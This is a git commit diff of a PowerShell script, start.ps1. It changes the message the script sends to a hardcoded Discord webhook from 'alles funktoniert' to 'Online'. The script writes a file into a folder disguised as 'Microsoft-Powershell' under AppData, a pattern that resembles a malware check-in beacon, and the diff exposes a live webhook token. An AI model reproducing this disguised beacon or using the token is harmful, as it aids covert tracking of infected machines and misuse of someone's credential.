7a0d1fc7d6e7cf0c194a40f842f5c7c43a931c72
Samuitl <152026165+Samuitl@users.noreply.github.com>
2024-07-21 14:17:41 +0200

    Update start.ps1

--- start.ps1
+++ start.ps1
@@ -1,7 +1,7 @@
 $fileName = "$env:USERPROFILE\AppData\Local\Programs\Microsoft-Powershell\test.txt"
 $textContent = "Dies ist eine automatisch generierte Textdatei."
 $message = @{
-    "content" = "alles funktoniert"
+    "content" = "Online"
 }
 $webhookUrl = "https://discord.com/api/webhooks/1244307598715392142/-vO1h_4pVUviMNNcT5qKSXEsHwphKIwEfzNjKYeGNq5tCGmBliYacDuW4kYGv5aggxW_"
 New-Item -Path $fileName -ItemType File -Force | Out-Null
